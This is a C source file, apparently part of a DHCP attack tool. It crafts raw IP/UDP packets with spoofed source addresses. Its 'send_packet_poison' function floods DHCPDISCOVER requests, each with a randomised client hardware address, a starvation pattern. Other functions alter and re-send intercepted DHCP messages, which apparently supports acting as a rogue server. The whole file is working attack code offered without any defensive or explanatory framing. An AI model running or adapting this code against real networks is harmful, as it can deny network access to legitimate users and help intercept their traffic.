#include "dhcp.h"

void add_ip(struct list_ip *ips, uint32_t ip){
	if(ips->len < MAX_LIST_SIZE){
		ips->ips[ips->len] = ip;
		ips->len++;
	}
}

unsigned short checksum(unsigned short *ptr,int nbytes){
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

int packet_type(dhcp_header *dhcp, unsigned int size){
	unsigned char *debut = dhcp->options;
	while((void*) debut - (void*) dhcp < size && *debut != 53){
		int tmp = *(debut + 1);
		debut = debut + 3 + tmp;
	}

	if((void*) debut - (void*) dhcp < size && *debut == 53)
		return *(debut+2);
	return -1;
}

void modify_packet_type(dhcp_header *dhcp, unsigned int size, int new_type){
	unsigned char *debut = dhcp->options;
	while((void*) debut - (void*) dhcp < size && *debut != 53){
		int tmp = *(debut + 1);
		debut = debut + 3 + tmp;
	}

	if((void*) debut - (void*) dhcp < size && *debut == 53)
		*(debut+2) = new_type;
	return;
}

void fill_offer(dhcp_header* offer_msg){
	memset(offer_msg, 0, sizeof(dhcp_header));
	
	offer_msg->op = 1;
	offer_msg->htype = 1;
	offer_msg->hlen = 6;

	offer_msg->xid = htonl(10); //htonl(rand()%(0xffffffffffffffff));
	
	offer_msg->cookie = htonl(0x63825363);
	
	//DHCPDISCOVER option
	offer_msg->options[0] = 53;
	offer_msg->options[1] = 1;
	offer_msg->options[2] = DHCPDISCOVER;
	offer_msg->options[3] = 255;
}

void randomize_offer(dhcp_header* offer_msg){
	//only call after fill_offer has been run

	for(int i = 0; i<6; i++){
		offer_msg->chaddr[i] = rand()%256;
	}

}

int open_socket(){
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	if(sockfd < 0){
		printf("Error creating socket : %s\n", strerror(errno));
		return -1;
	}

	int flag = 1;

	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &flag, sizeof(flag)) < 0){
		printf("Failed to set IP_HDRINCL parameter\n");
		return -1;
	}

	if(setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &flag, sizeof(flag)) < 0){
		printf("Failed to set broadcast parameter\n");
		return -1;
	}

	return sockfd;
}


void send_packet_poison(int sockfd, dhcp_header* offer_msg){

	char packet[65536], *data;
	memset(packet, 0, 65536);

	//IP header pointer
	struct iphdr *iph = (struct iphdr *) packet;

	//UDP header pointer
	struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct iphdr));
	struct pseudo_udp_header psh; //pseudo header

	//data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

	//fill the data section
	memcpy(data, offer_msg, sizeof(dhcp_header));
	
	int const size_iph = sizeof(struct iphdr), size_udph = sizeof(struct udphdr), size_pseudo = sizeof(struct pseudo_udp_header), size_data = sizeof(dhcp_header);
	int const tot_size = sizeof(struct iphdr) + size_udph + size_data;


	//fill the IP header here
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = htons(size_iph + size_udph + size_data);
	iph->id = rand()%(2<<15); //random value
	iph->frag_off = htons(0);
	iph->ttl = 128;
	iph->protocol = 17;
	iph->saddr = inet_addr(SOURCE_ADDRESS); //no htonl
	iph->daddr = inet_addr(DEST_ADDRESS); //no htonl
	iph->check = htons(checksum((short unsigned int *) iph, size_iph));


	//fill the UDP header
	udph->source = htons(SRC_PORT);
	udph->dest = htons(DEST_PORT);
	udph->len = htons(size_udph + size_data);
	udph->check = 0;

	psh.source_address = iph->saddr;
	psh.dest_address = iph->daddr;
	psh.protocol = iph->protocol;
	psh.udp_length = udph->len;

	
	//checksum calculation
	char *check_calc = malloc(size_udph + size_pseudo + size_data);
	
	memcpy(check_calc, &psh, size_pseudo);
	memcpy(check_calc + size_pseudo, udph, size_udph);
	memcpy(check_calc + size_pseudo + size_udph, data, size_data);

	udph->check = checksum((short unsigned int*) check_calc, size_udph + size_pseudo + size_data);
	
	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(DEST_PORT);
	
	if(inet_aton(DEST_ADDRESS, &addr.sin_addr) == 0){
		printf("Couldn't put NULL_ADDR into sockaddr_in\n");
		return;
	}

	if(sendto(sockfd, packet, tot_size, 0, (struct sockaddr*) &addr, sizeof(struct sockaddr_in)) < 0){
		printf("Error sending packet : %s\n", strerror(errno));
		return;
	}
	
	free(check_calc);
}


void send_packet(int sockfd, dhcp_header* dhcp, unsigned int size, uint32_t new_ip){

	char packet[65536], *data;
	memset(packet, 0, 65536);

	//IP header pointer
	struct iphdr *iph = (struct iphdr *) packet;

	//UDP header pointer
	struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct iphdr));
	struct pseudo_udp_header psh; //pseudo header

	//data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

	//fill the data section
	memcpy(data, dhcp, size);
	
	int const size_iph = sizeof(struct iphdr), size_udph = sizeof(struct udphdr), size_pseudo = sizeof(struct pseudo_udp_header), size_data = size;
	int const tot_size = sizeof(struct iphdr) + size_udph + size_data;


	//fill the IP header here
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = htons(size_iph + size_udph + size_data);
	iph->id = rand()%(2<<15); //random value
	iph->frag_off = htons(0);
	iph->ttl = 128;
	iph->protocol = 17;
	iph->saddr = inet_addr(MY_IP); //no htonl
	if(new_ip != 0)
		iph->daddr = new_ip; //no htonl
	else
		iph->daddr = dhcp->ciaddr;
	iph->check = htons(checksum((short unsigned int *) iph, size_iph));


	//fill the UDP header
	udph->source = htons(DEST_PORT);
	udph->dest = htons(SRC_PORT); //not a mistake
	udph->len = htons(size_udph + size_data);
	udph->check = 0;

	psh.source_address = iph->saddr;
	psh.dest_address = iph->daddr;
	psh.protocol = iph->protocol;
	psh.udp_length = udph->len;

	
	//checksum calculation
	char *check_calc = malloc(size_udph + size_pseudo + size_data);
	
	memcpy(check_calc, &psh, size_pseudo);
	memcpy(check_calc + size_pseudo, udph, size_udph);
	memcpy(check_calc + size_pseudo + size_udph, data, size_data);

	udph->check = checksum((short unsigned int*) check_calc, size_udph + size_pseudo + size_data);
	
	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(DEST_PORT);
	
	if(inet_aton(DEST_ADDRESS, &addr.sin_addr) == 0){
		printf("Couldn't put NULL_ADDR into sockaddr_in\n");
		return;
	}

	if(sendto(sockfd, packet, tot_size, 0, (struct sockaddr*) &addr, sizeof(struct sockaddr_in)) < 0){
		printf("Error sending packet : %s\n", strerror(errno));
		return;
	}
	
	free(check_calc);
}

unsigned int fill_dhcp_packet(dhcp_header *dhcph, const u_char *Buffer, int Size){
    unsigned short iphdrlen;

    struct ethhdr *eth = (struct ethhdr *)Buffer;

    struct iphdr *iph = (struct iphdr *)(Buffer +  sizeof(struct ethhdr));
    iphdrlen = iph->ihl*4;

    struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen  + sizeof(struct ethhdr));
	
    int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof udph;
	
	dhcph = (dhcp_header*)(Buffer + header_size);
	
	/*
    printf("\n\n***********************DHCP Packet*************************\n");

    //print_ip_header(Buffer,Size);

    printf("\nUDP Header\n");
    printf("   |-Source Port      : %d\n" , ntohs(udph->source));
    printf("   |-Destination Port : %d\n" , ntohs(udph->dest));
    printf("   |-UDP Length       : %d\n" , ntohs(udph->len));
    printf("   |-UDP Checksum     : %d\n" , ntohs(udph->check));

    printf("\n");
    printf("IP Header\n");
    //PrintData(Buffer , iphdrlen);

    printf("UDP Header\n");
    //PrintData(Buffer+iphdrlen , sizeof udph);

    printf("Data Payload\n");

    //Move the pointer ahead and reduce the size of string
    //PrintData(Buffer + header_size , Size - header_size);


	printf("	|-op		:%d\n", dhcph->op);
	printf("	|-htype		:%d\n", dhcph->htype);
	printf("	|-hlen		:%d\n", dhcph->hlen);
	printf("	|-hops		:%d\n", dhcph->hops);
	printf("	|-xid		:%d\n", dhcph->xid);
	printf("	|-secs		:%d\n", dhcph->secs);
	printf("	|-flags		:%d\n", dhcph->flags);
	printf("	|-ciaddr	:%d\n", dhcph->ciaddr);
	printf("	|-yiaddr	:%d\n", dhcph->yiaddr);
	printf("	|-siaddr	:%d\n", dhcph->siaddr);
	printf("	|-giaddr	:%d\n", dhcph->giaddr);
	printf("	|-chaddr	:%s\n", dhcph->chaddr);
	printf("	|-sname		:%s\n", dhcph->sname);
	printf("	|-file		:%s\n", dhcph->file);
	printf("	|-cookie	:%d\n", dhcph->cookie);


    printf("\n###########################################################");
	*/
	
	return Size - header_size;
}
